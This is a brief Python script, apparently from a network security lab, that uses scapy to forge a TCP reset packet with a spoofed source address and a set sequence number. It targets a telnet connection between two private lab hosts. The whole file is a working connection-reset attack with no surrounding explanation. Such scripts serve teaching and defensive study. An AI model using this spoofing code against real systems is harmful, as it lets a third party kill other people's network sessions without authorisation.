#!/usr/bin/env python3
from scapy.all import *

src_ip = "10.9.0.6"
dst_ip = "10.9.0.5"
src_port = 39458
dst_port = 23
seq_num = 1341174299
ack_num = 0  # not needed for RST

print("[+] Crafting TCP Reset packet...")

ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=src_port, dport=dst_port, flags="R", seq=seq_num)

rst_pkt = ip / tcp
send(rst_pkt, iface="br-bad22f081d4d", verbose=False)

print("[+] TCP Reset sent successfully.")

